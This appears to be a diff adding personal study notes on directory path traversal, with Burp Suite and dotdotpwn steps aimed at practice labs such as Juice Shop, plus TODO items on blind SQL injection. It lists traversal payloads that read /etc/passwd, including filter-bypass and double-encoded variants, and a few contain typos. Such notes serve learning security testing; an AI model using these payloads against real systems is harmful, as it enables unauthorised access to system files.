@@ -424,6 +424,37 @@ not change
 
 ######## Directory Path Traversal ########
 
+- Used in url bar to try and find access vulns through file direcotry
+-- Starting from home = /
+-- Go back 1 parent directory = ../
+-- Go back 2 parent directories = ../../
+-- Far enought to hit the root and now I have access to root files
+----- See if the request will allow access to files root directory
+----- ex: GET /filename=/etc/passwd
+-- If traversal sequences are stripped non-recursively:
+----- GET /filename=....//etc/passwd
+
+-- URL-Decoding
+---- ..%252f
+---- ex: GET /filename=..%252fect/password
+
+Using Burp Suite
+-- Intecept client request and send a few requests to repeater for examination
+-- Find places to test path traversal
+---- GET /image?filename=../../../etc/passwd
+---- GET filter/category/products=../../etc/passwd
+-- 200 success code shows you have accessed the target
+
+$ dotdotpwn
+-- Automated approach to path traversal
+---- sudo apt-get install dotdotpwn
+---- $ dotdotpwn -m http -h localhost:3000/#/login
+
+
+
+
+
+
 
 
 $ Juice Shop
@@ -431,7 +462,8 @@ $ Juice Shop
 
 $ Port Swigger
 - TODO: 
-
+-- Blind SQL Injection with conditional response
+-- Blind SQL Injection with conditional errors
 
 
 
